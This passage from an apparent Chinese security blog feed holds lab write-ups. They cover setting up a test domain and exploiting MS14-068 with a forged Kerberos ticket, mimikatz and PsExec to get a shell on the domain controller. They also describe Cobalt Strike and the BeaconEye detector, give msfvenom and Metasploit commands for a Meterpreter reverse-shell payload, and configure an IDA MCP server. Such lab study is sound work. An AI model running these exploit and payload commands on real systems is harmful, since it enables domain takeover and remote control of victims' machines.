<li><p>右下角，打开“网络和共享中心”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191627383.png" alt="image-20251003191627383"></p>
</li>
<li><p>配置IPv4地址为“10.10.10.2”。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191751608.png" alt="image-20251003191751608"></p>
</li>
<li><p>测试是否ping通域控服务器，打开cmd，<code>ping 10.10.10.1</code>。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003191911883.png" alt="image-20251003191911883"></p>
</li>
<li><p>打开计算机属性，高级系统设置，计算机名，更改。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003192037543.png" alt="image-20251003192037543"></p>
</li>
<li><p>输入域名。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003192150503.png" alt="image-20251003192150503"></p>
</li>
<li><p>确认之后弹出对话框，需要输入域管理员账号密码，输入之后点击确认，稍等一会，看见欢迎加入test.com域，就成功了，然后需要重启。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003192332897.png" alt="image-20251003192332897"></p>
</li>
<li><p>win7重启之后，登录需要重置密码，这里重置为<code>win7user1.</code></p>
</li>
<li><p>再返回到域控服务器，添加域用户alice，密码为<code>win7user1.</code>。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003193110805.png" alt="image-20251003193110805"></p>
</li>
<li><p>返回win7，使用创建的域用户登录，打开cmd，执行<code>net user /domain</code>命令，可以看到域账号。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%90%AD%E5%BB%BAwin2k8r2%E5%9F%9F%E5%8A%9F%E8%83%BD%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8D%95%E5%9F%9F%E7%8E%AF%E5%A2%83/image-20251003193408375.png" alt="image-20251003193408375"></p>
<p>后续为了区分不同账户，我又把admin账号的密码改为了<code>test@win7</code></p>
</li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透-MS14-068权限提升漏洞利用实验</title>
    <url>/2025/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>MS14-068是微软在2014年11月发布的一个紧急补丁，其对应的知识库编号是KB3011780。 该补丁修复了CVE-2014-6324漏洞，该漏洞允许攻击者通过利用Kerberos KDC漏洞，将普通域用户权限提升为域管理员权限。</p>
<h2 id="确认域控服务器是否安装补丁"><a href="#确认域控服务器是否安装补丁" class="headerlink" title="确认域控服务器是否安装补丁"></a>确认域控服务器是否安装补丁</h2><p>执行<code>systeminfo | findstr 3011780</code>，返回结果为空，则说明没安装补丁。</p>
<p><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003200158254.png" alt="image-20251003200158254"></p>
<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol>
<li>exploit程序（<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068%EF%BC%89">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068）</a></li>
<li>psexec（<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec%EF%BC%89">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec）</a></li>
<li>mimikatz（<a href="https://github.com/gentilkiwi/mimikatz%EF%BC%89">https://github.com/gentilkiwi/mimikatz）</a></li>
</ol>
<h2 id="漏洞利用复现"><a href="#漏洞利用复现" class="headerlink" title="漏洞利用复现"></a>漏洞利用复现</h2><ol>
<li><p>当前环境信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win2k8r2域控服务器IP：10.10.10.1</span><br><span class="line">加入域的win7主机IP：10.10.10.2</span><br><span class="line">普通域用户账号/密码：alice/win7user1.</span><br></pre></td></tr></table></figure></li>
<li><p>复制所有工具到win7。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201639494.png" alt="image-20251003201639494"></p>
</li>
<li><p>win7用普通域用户alice登录，测试访问域控的C盘共享，访问被拒绝。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003201923944.png" alt="image-20251003201923944"></p>
</li>
<li><p>使用mimikatz，执行<code>kereros::list</code>列出票据，执行<code>kerberos::purge</code>，将内存中已有的kerberos票据清除，再执行<code>kereros::list</code>确认是否清除票据。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202235047.png" alt="image-20251003202235047"><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202308878.png" alt="image-20251003202308878"></p>
</li>
<li><p>执行<code>whoami /all</code>查看本机用户SID。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003202543769.png" alt="image-20251003202543769"></p>
</li>
<li><p>利用ms14-068.exe提权工具生成伪造的kerberos协议认证证书。<code>MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</code></p>
</li>
<li><p>实际执行<code>MS14-068.exe -u alice@test.com -s S-1-5-21-2801992062-1918021354-1617932239-1108 -d 10.10.10.1 -p win7user1.</code>，执行完毕生成TGT。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203004853.png" alt="image-20251003203004853"></p>
</li>
<li><p>利用mimikatz.exe将证书写入，从而提升为域管理员。执行<code>kerberos::ptc 刚才生成的tgt路径</code><img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203245919.png" alt="image-20251003203245919"></p>
</li>
<li><p>再次列出域控制器的C盘目录，成功访问域控的C盘，说明普通域用户提权成域管理员用户成功。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203404168.png" alt="image-20251003203404168"></p>
</li>
<li><p>使用PSTools目录下的PsExec.exe获取shell，以域管理员权限运行连接域控。执行<code>PsExec.exe \\win2k8dc.test.com cmd.exe</code>。进入shell后，执行<code>ipconfig</code>确认是否是域控服务器IP<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/image-20251003203654003.png" alt="image-20251003203654003"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>使用BeaconEye排查cobaltstrike木马</title>
    <url>/2025/10/04/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="什么是cobaltstrike"><a href="#什么是cobaltstrike" class="headerlink" title="什么是cobaltstrike"></a>什么是cobaltstrike</h2><p>Cobalt Strike（简称 CS）是一款基于 Java 开发的<strong>商业级红队&#x2F;渗透测试 C2（Command &amp; Control）框架</strong>，采用 C&#x2F;S 架构：  </p>
<ul>
<li><strong>服务端</strong>（team server）唯一，必须运行在 Linux 上，默认监听 50050 端口；  </li>
<li><strong>客户端</strong>可多个，Windows&#x2F;Linux&#x2F;macOS 均可运行，支持多人协同作战。</li>
</ul>
<h3 id="核心能力"><a href="#核心能力" class="headerlink" title="核心能力"></a>核心能力</h3><ol>
<li><strong>后渗透与横向移动</strong>：内置 Beacon 载荷，支持 HTTP&#x2F;HTTPS&#x2F;DNS&#x2F;SMB 等多种回连协议，具备“低速慢速”异步通信特征，可绕过多数流量检测。  </li>
<li><strong>武器化生成</strong>：一键生成 Windows EXE&#x2F;DLL、Java、Office 宏、HTA、PowerShell、Payload-in-PDF 等木马，并可与外部漏洞利用模块组合。  </li>
<li><strong>钓鱼与社工</strong>：集成网站克隆、邮件群发、证书窃取、浏览器中间人劫持、UAC&#x2F;凭据弹窗欺骗等模块，用于模拟 APT 钓鱼入口。  </li>
<li><strong>内网隧道与代理</strong>：自动端口转发、SOCKS4a&#x2F;HTTP 代理、多层跳板，方便在隔离网段中横向。  </li>
<li><strong>权限维持与提权</strong>：支持计划任务、服务、WMI、注册表、Logon Script、DCOM 等多种持久化方式；集成 40+ 本地提权 exploit（UAC、内核、AlwaysInstallElevated 等）。  </li>
<li><strong>域渗透套件</strong>：凭据导出（hash、明文、Kerberos 票据）、Pass-the-Hash&#x2F;Pass-the-Ticket、Golden&#x2F;Silver Ticket、DCSync、BloodHound 结果导入等。  </li>
<li><strong>流量伪装与对抗</strong>：Malleable C2 配置文件允许自定义 URI、Header、证书、编码&#x2F;加密流程，可把流量伪装成正常网站、云盘、甚至模仿 Zeus、CozyBear 等已知恶意软件特征。  </li>
<li><strong>日志与报告</strong>：自动记录所有操作、截图、键盘记录，可导出为 ATT&amp;CK 映射报告，方便红队复盘与蓝队演练总结。</li>
</ol>
<h3 id="典型使用场景"><a href="#典型使用场景" class="headerlink" title="典型使用场景"></a>典型使用场景</h3><ul>
<li>红队评估：模拟 APT 攻击链，从入口→立足→横向→域控→数据窃取完整演练。  </li>
<li>蓝队对抗：检验 EDR、NDR、SIEM 检测规则与应急响应流程。  </li>
<li>内网审计：在授权情况下，验证内网隔离、补丁管理、最小权限原则有效性。</li>
</ul>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>Cobalt Strike 为<strong>商业收费软件</strong>（单授权年费数千美元），但网络上存在大量破解版，因此被黑灰产与真实 APT 组织广泛滥用。官方版本已加入水印、License 校验与云端溯源机制，<strong>非法使用存在被追踪风险</strong>。在中国，任何未授权的网络攻击行为均触犯《刑法》第 285、286 条，<strong>仅限在封闭靶场或客户书面授权范围内使用</strong>。</p>
<h2 id="什么是BeaconEye"><a href="#什么是BeaconEye" class="headerlink" title="什么是BeaconEye"></a>什么是BeaconEye</h2><p>BeaconEye 是一款专门用于<strong>检测和监控 Cobalt Strike Beacon</strong> 的开源安全工具，由安全研究者 @<em>EthicalChaos</em> 开发，2021 年 8 月首次发布后即因检出率高、绕过难度大而在防御端快速走红。其核心思路是<strong>把“Beacon 配置（Beacon Config）”作为强特征</strong>，通过扫描进程内存或离线 Minidump 文件，定位并解析 Beacon 运行时解密后的配置数据，从而判断目标进程是否被注入 Beacon，同时可提取 C2 地址、命令输出等关键信息。</p>
<h3 id="1-工作原理"><a href="#1-工作原理" class="headerlink" title="1. 工作原理"></a>1. 工作原理</h3><ul>
<li>Beacon 在启动时会将一份完整的 TLV 格式配置表（含 C2、URI、心跳间隔、是否启用 sleep_mask 等参数）两次解密到堆内存；BeaconEye 利用 yara 规则匹配这块“解密后、使用前”的配置结构即可瞬间锁定 Beacon。</li>
<li>工具附带调试器功能，可在活进程上动态挂钩，实时解密 HTTP&#x2F;HTTPS Beacon 的 AES 会话密钥，把攻击者下发的命令与回显落地成日志，实现“上帝视角”取证。</li>
</ul>
<h3 id="2-主要功能"><a href="#2-主要功能" class="headerlink" title="2. 主要功能"></a>2. 主要功能</h3><ul>
<li>扫描运行进程或离线 dump：支持按进程名过滤，可批量审计终端或服务器内存镜像。</li>
<li>导出 Beacon 配置：自动解析 C2 地址、端口、心跳、User-Agent、PublicKey 等字段。</li>
<li>监控 C2 交互：实时记录命令输入与输出、屏幕截图，为后续溯源提供原始证据。</li>
<li>检测隐藏&#x2F;注入 Beacon：对使用了 sleep_mask、进程注入、自定义 loader 的样本同样有效。</li>
<li>多平台编译：原版基于 .NET ≥4.0，另有 Golang 重写的 EvilEye 供无 .NET 环境使用。</li>
</ul>
<h3 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3. 使用场景"></a>3. 使用场景</h3><ul>
<li>企业威胁狩猎：定期巡检关键服务器与终端，发现潜伏 Beacon。</li>
<li>应急响应：在疑似被攻陷主机上快速确认是否存在 Cobalt Strike 控制通道。</li>
<li>取证分析：对已获得的内存镜像或 Minidump 文件离线扫描，提取攻击者 C2 信息。</li>
</ul>
<h3 id="4-局限与对抗"><a href="#4-局限与对抗" class="headerlink" title="4. 局限与对抗"></a>4. 局限与对抗</h3><ul>
<li>仅支持 HTTP&#x2F;HTTPS Beacon 的实时流量解密；对 DNS、SMB、TCP Pipe 模式只能做静态检出。</li>
<li>BeaconEye 的规则高度依赖“标准 TLV 配置”结构，通过自定义 loader、在堆上打乱顺序、手动修改配置长度或把配置挪到栈&#x2F;其他堆块，可实现 Bypass。</li>
<li>从 CS 4.5 起官方引入 sleep_mask（睡眠时加密堆内存）并持续更新混淆策略，需要防御者及时更新扫描器或配合 yara、ETW、ETI 等多维度规则。</li>
</ul>
<p>一句话总结：BeaconEye 就是“专门在内存里找 Cobalt Strike 信标”的猎手工具，凭借对 Beacon Config 的高置信特征匹配，让大量传统隐匿手段失效，是目前蓝队威胁狩猎与应急取证中必备的“探照灯”之一。</p>
<h2 id="BeaconEye使用"><a href="#BeaconEye使用" class="headerlink" title="BeaconEye使用"></a>BeaconEye使用</h2><ol>
<li>执行上线。<img src="/../images/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/image-20251004212757275.png" alt="image-20251004212757275"></li>
<li>下载。<a href="https://github.com/CCob/BeaconEye/releases/tag/0.3">https://github.com/CCob/BeaconEye/releases/tag/0.3</a></li>
<li>运行。<img src="/../images/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/image-20251004212933322.png" alt="image-20251004212933322"></li>
<li>很奇怪没扫到。</li>
</ol>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>蓝队</tag>
      </tags>
  </entry>
  <entry>
    <title>使用IDA PRO 7.0分析msf生成的exe木马</title>
    <url>/2025/10/04/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>kali linux攻击者IP：10.10.10.100</li>
<li>win7受害者IP：10.10.10.2</li>
<li>确保主机之间能ping通。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004162601751.png" alt="image-20251004162601751"></li>
<li>如果kali主机ping不通win7主机，请检查防火墙规则。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004162427496.png" alt="image-20251004162427496"></li>
</ol>
<h2 id="使用msfconsole监听木马"><a href="#使用msfconsole监听木马" class="headerlink" title="使用msfconsole监听木马"></a>使用msfconsole监听木马</h2><ol>
<li>执行<code>msfconsole</code>。进入框架。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163014757.png" alt="image-20251004163014757"></li>
<li>执行如下命令。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp   # 必须与 msfvenom 生成木马一致</span><br><span class="line">set LHOST 10.10.10.100                        # 攻击机 IP</span><br><span class="line">set LPORT 4444                                # 攻击机端口</span><br><span class="line">set ExitOnSession true                        # 保持监听，可接多个会话</span><br><span class="line">exploit -j -z                                 # 启用监听 -j 后台任务形式，-z 会话成功后自动放到后台</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163633188.png" alt="image-20251004163633188"></p>
<h2 id="使用msfvenom生成木马"><a href="#使用msfvenom生成木马" class="headerlink" title="使用msfvenom生成木马"></a>使用msfvenom生成木马</h2><ol>
<li>命令格式。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp \</span><br><span class="line">         LHOST=&lt;你的Kali IP&gt; \</span><br><span class="line">         LPORT=&lt;监听端口&gt; \</span><br><span class="line">         -f exe -o &lt;文件名&gt;.exe</span><br></pre></td></tr></table></figure></li>
<li>测试生成。<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.100 LPORT=4444 -f exe -o payload.exe</code><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163915055.png" alt="image-20251004163915055"></li>
</ol>
<h2 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h2><ol>
<li>将payload.exe拷贝到win7主机。</li>
<li>双击执行。</li>
<li>查看kali主机。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions -l            # 列出所有会话</span><br><span class="line">sessions -i 1          # 进入编号为 1 的 Meterpreter</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004164256100.png" alt="image-20251004164256100"></p>
<h2 id="逆向分析exe"><a href="#逆向分析exe" class="headerlink" title="逆向分析exe"></a>逆向分析exe</h2><ol>
<li>打开ida.exe，打开payload.exe。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004164516071.png" alt="image-20251004164516071"></li>
</ol>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>蓝队</tag>
        <tag>溯源反制</tag>
      </tags>
  </entry>
  <entry>
    <title>使用MCP自动化调用IDA进行逆向分析</title>
    <url>/2025/10/06/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol>
<li>Cherry-Studio</li>
<li>IDA 9.0</li>
<li>python-3.11.1</li>
</ol>
<h2 id="安装ida-pro-mcp"><a href="#安装ida-pro-mcp" class="headerlink" title="安装ida-pro-mcp"></a>安装ida-pro-mcp</h2><ol>
<li>执行<code>pip install ida-pro-mcp</code></li>
<li>执行<code>ida-pro-mcp --install</code></li>
<li>重启ida，看到mcp插件，则说明安装成功。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007173311270.png" alt="image-20251007173311270"></li>
<li>第3步骤遇到问题，报错如下。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/ida-pro-mcp%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5.png" alt="ida-pro-mcp安装失败"></li>
<li>原来是缺少git，安装git之后，重新执行<code>ida-pro-mcp --install</code>，看到如下输出应该就是安装成功了。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007173634004.png" alt="image-20251007173634004"></li>
</ol>
<h2 id="配置Cherry"><a href="#配置Cherry" class="headerlink" title="配置Cherry"></a>配置Cherry</h2><ol>
<li>打开Cherry的设置。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007174046913.png" alt="image-20251007174046913"></li>
<li>复制配置文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;mcpServers&quot;: &#123;</span><br><span class="line">    &quot;github.com/mrexodia/ida-pro-mcp&quot;: &#123;</span><br><span class="line">      &quot;isActive&quot;: true,</span><br><span class="line">      &quot;command&quot;: &quot;D:\\python3.11\\python.exe&quot;,</span><br><span class="line">      &quot;args&quot;: [</span><br><span class="line">        &quot;D:\\python3.11\\Lib\\site-packages\\ida_pro_mcp\\server.py&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;timeout&quot;: 1800,</span><br><span class="line">      &quot;disabled&quot;: false,</span><br><span class="line">      &quot;autoApprove&quot;: [</span><br><span class="line">        &quot;check_connection&quot;,</span><br><span class="line">        &quot;get_metadata&quot;,</span><br><span class="line">        &quot;get_function_by_name&quot;,</span><br><span class="line">        &quot;get_function_by_address&quot;,</span><br><span class="line">        &quot;get_current_address&quot;,</span><br><span class="line">        &quot;get_current_function&quot;,</span><br><span class="line">        &quot;convert_number&quot;,</span><br><span class="line">        &quot;list_functions&quot;,</span><br><span class="line">        &quot;list_strings&quot;,</span><br><span class="line">        &quot;search_strings&quot;,</span><br><span class="line">        &quot;decompile_function&quot;,</span><br><span class="line">        &quot;disassemble_function&quot;,</span><br><span class="line">        &quot;get_xrefs_to&quot;,</span><br><span class="line">        &quot;get_entry_points&quot;,</span><br><span class="line">        &quot;set_comment&quot;,</span><br><span class="line">        &quot;rename_local_variable&quot;,</span><br><span class="line">        &quot;rename_global_variable&quot;,</span><br><span class="line">        &quot;set_global_variable_type&quot;,</span><br><span class="line">        &quot;rename_function&quot;,</span><br><span class="line">        &quot;set_function_prototype&quot;,</span><br><span class="line">        &quot;declare_c_type&quot;,</span><br><span class="line">        &quot;set_local_variable_type&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;alwaysAllow&quot;: [</span><br><span class="line">        &quot;check_connection&quot;,</span><br><span class="line">        &quot;get_metadata&quot;,</span><br><span class="line">        &quot;get_function_by_name&quot;,</span><br><span class="line">        &quot;get_function_by_address&quot;,</span><br><span class="line">        &quot;get_current_address&quot;,</span><br><span class="line">        &quot;get_current_function&quot;,</span><br><span class="line">        &quot;convert_number&quot;,</span><br><span class="line">        &quot;list_functions&quot;,</span><br><span class="line">        &quot;list_strings&quot;,</span><br><span class="line">        &quot;search_strings&quot;,</span><br><span class="line">        &quot;decompile_function&quot;,</span><br><span class="line">        &quot;disassemble_function&quot;,</span><br><span class="line">        &quot;get_xrefs_to&quot;,</span><br><span class="line">        &quot;get_entry_points&quot;,</span><br><span class="line">        &quot;set_comment&quot;,</span><br><span class="line">        &quot;rename_local_variable&quot;,</span><br><span class="line">        &quot;rename_global_variable&quot;,</span><br><span class="line">        &quot;set_global_variable_type&quot;,</span><br><span class="line">        &quot;rename_function&quot;,</span><br><span class="line">        &quot;set_function_prototype&quot;,</span><br><span class="line">        &quot;declare_c_type&quot;,</span><br><span class="line">        &quot;set_local_variable_type&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;name&quot;: &quot;ida-pro-mcp&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>点击编辑，粘贴配置文件进去，注意<code>command</code>和<code>args</code>键的值要替换成你的环境的值。配置完成后能看到个绿色的电脑✔<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007174329329.png" alt="image-20251007174329329"></li>
<li>启动Cherry，点击默认助手，选择MCP服务器，点击启用。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007175404509.png" alt="image-20251007175404509"></li>
</ol>
<h2 id="测试CTF题目"><a href="#测试CTF题目" class="headerlink" title="测试CTF题目"></a>测试CTF题目</h2><ol>
<li><p>使用攻防世界的题目做测试（<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a></p>
</li>
<li><p>这里下载题目easyRE1做测试。</p>
</li>
<li><p>把题目文件拖进ida，选择MCP插件，左下角输出监听端口，如果提示端口被占用，请杀掉占用的程序再继续。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007175643749.png" alt="image-20251007175643749"></p>
</li>
<li><p>开始分析，发现需要API密钥。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007180001212.png" alt="image-20251007180001212"></p>
</li>
<li><p>根据提示获取密钥，填写密钥之后还是报同样的错误。</p>
</li>
<li><p>返回检查mcp服务器配置。发现报错。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007191412340.png" alt="image-20251007191412340"></p>
</li>
